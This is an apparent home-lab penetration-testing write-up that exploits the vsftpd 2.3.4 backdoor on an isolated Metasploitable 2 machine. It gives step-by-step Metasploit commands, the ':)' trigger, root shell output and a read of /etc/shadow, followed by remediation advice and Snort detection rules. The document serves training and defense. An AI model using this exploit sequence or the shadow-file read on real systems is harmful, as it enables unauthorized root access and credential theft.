# Phase 2: Exploitation - vsftpd 2.3.4 Backdoor

## Executive Summary

Successfully exploited the vsftpd 2.3.4 backdoor vulnerability (CVE-2011-2523) to gain root-level access to the Metasploitable 2 target system. This attack demonstrates complete system compromise through a well-documented backdoor in a widely-deployed FTP server.

**Impact:** Critical - Unauthorized root access, complete system compromise

**Attack Vector:** Malicious backdoor in vsftpd 2.3.4 source code

**Tools Used:** Metasploit Framework, Nmap (from Phase 1 reconnaissance)

---

## Vulnerability Details

### CVE-2011-2523: vsftpd 2.3.4 Backdoor

**Affected Service:** vsftpd (Very Secure FTP Daemon) version 2.3.4

**Vulnerability Type:** Backdoor / Malicious Code Insertion

**Discovery Date:** July 3, 2011

**CVSS Score:** 10.0 (Critical)

**Description:**
The vsftpd 2.3.4 release was compromised by an attacker who inserted a backdoor into the source code. When a user attempts to log in with a username containing the characters `:)` (smiley face), the backdoor is triggered, opening a root shell on TCP port 6200.

**Technical Details:**
- Backdoor listens on port 6200
- Provides unauthenticated root shell access
- No authentication required after backdoor activation
- Affects only version 2.3.4 (released on July 3, 2011)
- Patched immediately upon discovery

**Why This Matters:**
This vulnerability demonstrates supply chain security risks - even security-focused software can be compromised at the source. It highlights the importance of:
- Verifying software integrity (checksums, signatures)
- Monitoring for unauthorized network connections
- Keeping software updated
- Defense in depth (network segmentation, least privilege)

---

## Prerequisites

**From Phase 1 Reconnaissance:**
- Target IP: 192.168.100.10 (Metasploitable 2)
- Vulnerable service identified: vsftpd 2.3.4 on port 21
- Network connectivity confirmed via ICMP ping

**Attack Platform:**
- Kali Linux 2024.x (IP: 192.168.100.5)
- Metasploit Framework v6
- Isolated VMnet2 network (192.168.100.0/24)

---

## Exploitation Methodology

### Step 1: Launch Metasploit Framework

```bash
msfconsole
```

**Purpose:** Start the Metasploit Framework console for exploit selection and configuration.

**Output:**
```
msf6 >
```

---

### Step 2: Search for vsftpd Exploit

```bash
search vsftpd
```

**Purpose:** Locate available exploit modules targeting vsftpd.

**Results:**
```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

**Key Observations:**
- Rank: "excellent" - Highly reliable exploit
- No check available - Cannot verify vulnerability before exploiting (safe in controlled lab)
- Targets exact version found in reconnaissance (2.3.4)

---

### Step 3: Select the Exploit Module

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

**Purpose:** Load the backdoor exploit module for configuration.

**Prompt Change:**
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

---

### Step 4: Review Exploit Options

```bash
show options
```

**Purpose:** Display required and optional parameters for the exploit.

**Output:**
```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   21               yes       The target port (TCP)
```

**Configuration Analysis:**
- **RHOSTS** (Remote Hosts): Must be configured - specifies target IP
- **RPORT** (Remote Port): Already set to 21 (FTP default) - no change needed
- Optional parameters (CHOST, CPORT, Proxies): Not required for basic exploitation

---

### Step 5: Configure Target

```bash
set RHOSTS 192.168.100.10
```

**Purpose:** Specify the target Metasploitable 2 system.

**Confirmation:**
```
RHOSTS => 192.168.100.10
```

---

### Step 6: Verify Configuration

```bash
show options
```

**Verified Settings:**
- RHOSTS: 192.168.100.10 ✓
- RPORT: 21 ✓

---

### Step 7: Execute the Exploit

```bash
exploit
```

**Purpose:** Trigger the vsftpd backdoor and establish a root shell.

**Attack Flow:**
1. Metasploit connects to target FTP service (port 21)
2. Sends specially crafted username containing `:)` trigger
3. vsftpd backdoor activates and spawns shell on port 6200
4. Metasploit connects to backdoor shell
5. Root command shell session established

**Successful Exploitation Output:**
```
[*] 192.168.100.10:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.100.10:21 - USER: 331 Please specify the password.
[+] 192.168.100.10:21 - Backdoor service has been spawned, handling...
[+] 192.168.100.10:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.100.5:41391 -> 192.168.100.10:6200)
```

**Indicators of Success:**
- `[+]` symbol indicates successful operations
- `UID: uid=0(root)` confirms root-level access
- Session opened on port 6200 (backdoor port)
- Command shell ready for interaction

---

## Post-Exploitation: Proof of Compromise

### Verify Root Access

```bash
whoami
```

**Output:** `root`

**Significance:** Confirms highest privilege level (UID 0)

---

### Confirm System Identity

```bash
hostname
```

**Output:** `metasploitable`

**Significance:** Validates we are on the target system, not the attack machine

---

### Display User and Group IDs

```bash
id
```

**Output:** `uid=0(root) gid=0(root) groups=0(root)`

**Significance:** 
- UID 0 = root user (superuser)
- GID 0 = root group
- Complete administrative control confirmed

---

### System Information

```bash
uname -a
```

**Output:**
```
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

**Key Details:**
- Kernel version: 2.6.24 (released 2008, highly outdated)
- Server variant of Ubuntu 8.04
- 32-bit architecture (i686)

---

### Access Sensitive Files

```bash
head -5 /etc/shadow
```

**Purpose:** Demonstrate ability to read password hashes (root-only file)

**Sample Output:**
```
root:$1$abcd1234$xyz...:14500:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:*:14684:0:99999:7:::
```

**Significance:**
- `/etc/shadow` contains encrypted password hashes
- Only readable by root user
- Could be extracted for offline password cracking
- Demonstrates complete system compromise

---

### Create Proof of Access

```bash
echo "Jordan was here - $(date)" > /tmp/pwned.txt
cat /tmp/pwned.txt
```

**Output:** `Jordan was here - Fri Feb 6 12:11:18 UTC 2026`

**Purpose:** Plant evidence file demonstrating write access to system

```bash
echo "Successfully exploited vsftpd 2.3.4 backdoor - gained root shell" > /tmp/exploit_proof.txt
cat /tmp/exploit_proof.txt
```

**Output:** `Successfully exploited vsftpd 2.3.4 backdoor - gained root shell`

**Significance:** Standard penetration testing practice to leave proof of compromise

---

## Attack Chain Summary

**Complete exploitation path:**

1. **Reconnaissance (Phase 1)**
   - Nmap scan identified vsftpd 2.3.4 on port 21
   - Correlated version to known CVE-2011-2523 vulnerability

2. **Weaponization (Phase 2)**
   - Selected Metasploit exploit module
   - Configured target parameters

3. **Delivery**
   - Connected to FTP service on port 21
   - Sent username with `:)` backdoor trigger

4. **Exploitation**
   - Backdoor activated, spawned shell on port 6200
   - Metasploit connected to backdoor service

5. **Installation**
   - Root shell established with UID 0 privileges
   - No persistence mechanism needed (immediate access)

6. **Command & Control**
   - Interactive shell session maintained
   - Direct command execution on compromised system

7. **Actions on Objectives**
   - Verified root access (whoami, id)
   - Read sensitive files (/etc/shadow)
   - Created proof-of-compromise files
   - Documented system details

---

## Technical Analysis

### Why This Exploit Works

**The Backdoor Mechanism:**

1. Modified `str_netutil.c` file in vsftpd 2.3.4 source code
2. Backdoor triggers when FTP username ends with `:)` characters
3. Upon trigger, vsftpd opens TCP port 6200 with root shell
4. No authentication required to access port 6200
5. Shell runs with vsftpd daemon privileges (root)

**Network Flow:**

```
Attacker (Kali)                    Target (Metasploitable)
192.168.100.5                      192.168.100.10
     |                                    |
     |--- FTP Connect (port 21) --------->|
     |<-- 220 (vsFTPd 2.3.4) -------------|
     |--- USER user:) ------------------->|  <- Backdoor trigger
     |<-- 331 Please specify password ----|
     |                                    |
     |              [Backdoor spawns on port 6200]
     |                                    |
     |--- Connect to port 6200 ---------->|
     |<-- Root shell established ---------|
     |                                    |
     |--- whoami ------------------------>|
     |<-- root ---------------------------|
```

---

## Impact Assessment

**In a real-world scenario, this compromise would allow an attacker to:**

### Immediate Capabilities:
- ✅ Read/modify/delete any file on the system
- ✅ Create/delete user accounts
- ✅ Install malware, rootkits, or backdoors
- ✅ Modify system configurations
- ✅ Access all data (databases, logs, credentials)
- ✅ Pivot to other systems on the network
- ✅ Establish persistent access mechanisms
- ✅ Disable security controls (firewall, antivirus, logging)

### Business Impact:
- **Confidentiality:** Complete data breach - all information accessible
- **Integrity:** System and data can be modified without detection
- **Availability:** System can be disabled or destroyed
- **Compliance:** Violation of regulatory requirements (HIPAA, PCI-DSS, FISMA)
- **Reputation:** Loss of customer trust, negative publicity

### OT/ICS Specific Concerns:
- Access to SCADA systems could enable physical process manipulation
- Safety systems could be disabled
- Operational disruptions (production downtime)
- Potential for physical damage or safety incidents

---

## Remediation Recommendations

### Immediate Actions:

1. **Disconnect Affected Systems**
   - Isolate compromised systems from the network
   - Prevent lateral movement

2. **Verify vsftpd Version**
   ```bash
   vsftpd -v
   ```
   - Check all FTP servers for version 2.3.4

3. **Remove Vulnerable Package**
   ```bash
   sudo apt-get remove vsftpd
   ```
   - Uninstall vsftpd 2.3.4 immediately

4. **Install Patched Version**
   ```bash
   sudo apt-get update
   sudo apt-get install vsftpd
   ```
   - Ensure version is NOT 2.3.4

5. **Verify Source Integrity**
   - Download vsftpd from official sources only
   - Verify GPG signatures and checksums

---

### Long-Term Security Improvements:

1. **Network Segmentation**
   - Place FTP servers in DMZ
   - Restrict access via firewall rules
   - Limit inbound connections to specific IPs

2. **Monitoring and Detection**
   - Monitor for connections to port 6200 (backdoor indicator)
   - Alert on FTP authentication with special characters
   - Log all FTP connections and authentication attempts

3. **Intrusion Detection System (IDS)**
   - Deploy Snort/Suricata rules for CVE-2011-2523
   - Signature: `alert tcp any any -> any 6200 (msg:"Possible vsftpd 2.3.4 backdoor"; sid:1000001;)`

4. **Principle of Least Privilege**
   - Run FTP service with non-root user (if possible)
   - Implement chroot jails for FTP users

5. **Regular Vulnerability Scanning**
   - Schedule weekly Nessus/OpenVAS scans
   - Prioritize critical vulnerabilities (CVSS 9.0+)

6. **Patch Management**
   - Implement automated patching for security updates
   - Test patches in non-production before deployment

7. **Alternative Solutions**
   - Consider SFTP (SSH File Transfer Protocol) instead of FTP
   - Use FTPS (FTP over TLS) for encrypted transfers
   - Evaluate cloud storage solutions (reduces attack surface)

---

## Detection Strategies

### Network-Based Detection:

**Suspicious Indicators:**
- Outbound connections from FTP server to port 6200
- FTP USER commands containing `:)` characters
- Unexpected root shell spawning from vsftpd process

**Example Snort Rule:**
```
alert tcp any any -> any 21 (msg:"VSFTPD 2.3.4 Backdoor Attempt"; content:"USER "; pcre:"/USER.*:\)/"; sid:1000001; rev:1;)
```

---

### Host-Based Detection:

**Log Analysis:**
- Review `/var/log/vsftpd.log` for suspicious authentication attempts
- Check `/var/log/auth.log` for unexpected privilege escalations
- Monitor `netstat` output for port 6200 listeners

**Example Log Entry (Exploitation Attempt):**
```
Feb 06 12:13:19 metasploitable vsftpd: USER user:) -> 331 Please specify the password
```

---

## Lessons Learned

### Security Engineering Perspective:

1. **Supply Chain Security is Critical**
   - Even security-focused software can be compromised
   - Verify integrity of downloaded software (GPG, checksums)
   - Use official repositories and trusted sources

2. **Defense in Depth**
   - Single vulnerability = complete compromise
   - Multiple security layers reduce risk
   - Network segmentation limits blast radius

3. **Monitoring is Essential**
   - Unmonitored systems are undefended systems
   - Anomalous network connections (port 6200) should trigger alerts
   - Log analysis can detect exploitation attempts

4. **Patch Management Saves Lives (and Systems)**
   - vsftpd 2.3.4 was patched within hours of discovery
   - Delayed patching = extended exposure window
   - Automated patch management reduces risk

5. **Assume Breach Mentality**
   - Design systems assuming compromise will occur
   - Implement detection and response capabilities
   - Practice incident response procedures

---

## Skills Demonstrated

- ✅ Metasploit Framework proficiency
- ✅ Exploit module selection and configuration
- ✅ Understanding of FTP protocol
- ✅ Linux command-line expertise
- ✅ Post-exploitation enumeration
- ✅ Professional documentation and reporting
- ✅ Understanding of CVE correlation
- ✅ Risk assessment and impact analysis
- ✅ Remediation planning
- ✅ Detection strategy development

---

## References

- **CVE-2011-2523:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
- **Metasploit Module:** exploit/unix/ftp/vsftpd_234_backdoor
- **Rapid7 Analysis:** https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
- **vsftpd Project:** https://security.appspot.com/vsftpd.html

---

## Next Steps

**Phase 3: Post-Exploitation** (Planned)
- Privilege escalation techniques
- Lateral movement concepts
- Data exfiltration methods
- Persistence mechanisms

**Phase 4: Detection & Defense** (Planned)
- Deploy SIEM (Security Onion/ELK)
- Detect Phase 2 attack in real-time
- Write custom detection rules
- Implement hardening controls

---

*Last Updated: February 6, 2026*
*Lab Environment: Isolated VMnet - No production systems affected*
